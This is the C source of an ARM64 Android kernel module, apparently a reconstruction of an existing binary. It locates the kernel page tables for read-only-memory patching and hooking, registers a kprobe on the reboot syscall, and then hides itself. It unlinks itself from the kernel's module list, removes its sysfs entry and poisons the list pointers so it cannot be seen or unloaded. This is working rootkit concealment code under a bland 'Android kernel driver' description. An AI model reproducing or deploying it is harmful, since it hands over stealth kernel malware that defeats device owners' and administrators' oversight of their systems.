// SPDX-License-Identifier: GPL-2.0
/* module entry/exit + self-conceal. */

#include <linux/init.h>
#include <linux/kobject.h>
#include <linux/kprobes.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/poison.h>
#include <linux/types.h>

#include <asm/memory.h>
#include <asm/sysreg.h>

#include <driver/types.h>

#include "comm.h"
#include "lifecycle.h"
#include "log.h"

struct drv_state drv;

/* TTBR1_EL1[47:12] holds the swapper_pg_dir PA (low 12 bits zero, high bits store the ASID). 0x7FFFFFF000 masks both away. memstart_addr is the kernel's PA base; (PA - memstart_addr) | PAGE_OFFSET is the open-coded __va () the binary uses. */
#define DRV_TTBR1_PA_MASK 0x7FFFFFF000ULL
#define DRV_LINEAR_MAP_OFFSET 0xFFFFFF8000000000ULL

/* Initialise drv.m_page_level and drv.m_pgd_va from TCR_EL1 / TTBR1_EL1 -- the values the binary captures at dispatch_ioctl case 0xD1 (DRV_CMD_INSTALL_HOOKS). We compute them once at module init so write_ro_memory (and every hook_install path) sees them populated regardless of which ioctl arrives first. T0SZ is TCR_EL1[21:16]; m_page_level = (60 - T0SZ) / 9 == ceil((48 - T0SZ) / 9). For VA_BITS=39 (Android 6.6 typical) T0SZ=25 -> level_count=3 (PUD->PMD->PTE). */
static void mm_globals_init(void) {
	u64 tcr = read_sysreg(tcr_el1);
	u64 ttbr1 = read_sysreg(ttbr1_el1);
	u32 t0sz = (tcr >> 16) & 0x3Fu;
	u64 pgd_pa = ttbr1 & DRV_TTBR1_PA_MASK;

	drv.m_page_level = (60u - t0sz) / 9u;
	drv.m_pgd_va = (pgd_pa - (u64)memstart_addr) | DRV_LINEAR_MAP_OFFSET;
}

/* WARNING: touches the global modules list (mod->list) and modules_kset list (mod->mkobj.kobj.entry) without holding module_mutex / modules_kset->list_lock. The original .ko performs the same unlocked mutation; we preserve that 1:1. In practice do_init_module() runs under module_mutex on most 6.x kernels so the race is narrow, but that is not a published contract -- treat as a known on-spec hazard against concurrent insmod/rmmod. */
void conceal_module(void) {
	struct module *mod = THIS_MODULE;

	/* Unlink from the global modules list, then re-init to a self-loop. Matches the original's inlined __list_del + STR X19,[X19]/[X19,#8] sequence: any later traversal sees an empty (but valid) head rather than the LIST_POISON1/2 trap values list_del() would leave behind. */
	list_del(&mod->list);
	INIT_LIST_HEAD(&mod->list);

	/* Drop /sys/module/<name>. kobject_del() internally list_del_init's mod->mkobj.kobj.entry from modules_kset->list, leaving it self-looped. */
	kobject_del(&mod->mkobj.kobj);

	/* Re-issue list_del on the now-self-looped kobj.entry purely to stamp LIST_POISON1/2 into it -- this is what the original .ko does on the second list_head (offset 0x19270/0x19278 = &mkobj.kobj.entry) so later traversal trap-faults on the poison values. The validation in list_del passes because the self-loop satisfies entry->next->prev == entry. */
	list_del(&mod->mkobj.kobj.entry);
}

int __init init_driver(void) {
	int ret;

	pr_drv("driver_entry\n");

	/* Capture swapper_pg_dir + pagewalk depth before any hook path can run -- write_ro_memory's level_count==0 guard would silently no-op every patch otherwise. */
	mm_globals_init();

	ret = register_kprobe(&reboot_kp);
	if (ret < 0) {
		pr_drv_err("register_kprobe (__arm64_sys_reboot) failed: %d\n", ret);
		return ret;
	}

	conceal_module();
	return 0;
}

void __exit cleanup_driver(void) {
	pr_drv("driver_unload\n");

	/* conceal_module () makes us unreachable so the loader never invokes this; kept for builds that toggle conceal off. */
	unregister_kprobe(&reboot_kp);
}

module_init(init_driver);
module_exit(cleanup_driver);

/* Cargo-culted namespace import preserved verbatim from the original .ko modinfo. The token does not name any namespace that exists in mainline Linux 5.4-6.12 (verified via Bootlin Elixir); MODULE_IMPORT_NS expands to a modinfo string only, so this is a no-op at build/load time, but we keep it because byte-exactness vs. the source binary is part of the spec. */
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Anonymous");
MODULE_DESCRIPTION("Android kernel driver");
MODULE_IMPORT_NS(VFS_internal_I_am_really_a_filesystem_and_am_NOT_a_driver);
